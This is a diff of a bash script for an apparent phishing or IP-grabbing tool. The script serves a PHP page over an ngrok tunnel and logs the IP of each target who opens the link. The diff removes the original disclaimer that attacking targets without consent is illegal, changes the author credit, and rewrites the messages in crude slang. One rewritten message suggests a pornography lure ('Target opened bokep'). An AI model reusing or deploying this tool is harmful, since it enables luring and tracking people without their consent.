@@ -23,10 +23,10 @@ printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          github.com/WongBiasa        
 printf "\n"
 printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
 printf "         testing in an authorized simulated cyberattack\n"
-printf "         Attacking targets without prior mutual consent\n"
-printf "         is illegal!\n"
-printf "          Tested on Latest Versions......\n"
-printf "         For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
+printf "         Author WhoMHw\n"
+printf "         ora ngehek ora seneng!\n"
+printf "          Tool pemberihan thelinux ......\n"
+printf "         For Any help search 'Youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA '\n"
 
 printf "\n"
 
@@ -56,7 +56,7 @@ exit 1
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it.(apt install php) Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "install php dulu cok.(apt install php) Aborting."; exit 1; }
 
 
 }
@@ -80,7 +80,7 @@ while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened bokep!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -106,8 +106,8 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it(apt install unzip). Aborting."; exit 1; }
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it(apt install wget). Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "install unzip su. Install it(apt install unzip). Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "install wget su. Install it(apt install wget). Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -149,7 +149,7 @@ fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Turn On Hotspot if on termux) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Hostpotnya Hidupin su!!) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
 php -S 0.0.0.0:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server(Hotspot must be started) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
@@ -218,7 +218,7 @@ checkfound
 
 else
 printf "\e[91m[!] File not found\n"
-printf " For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
+printf " For Any help search 'Youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA '\n"
 
 
 exit 1
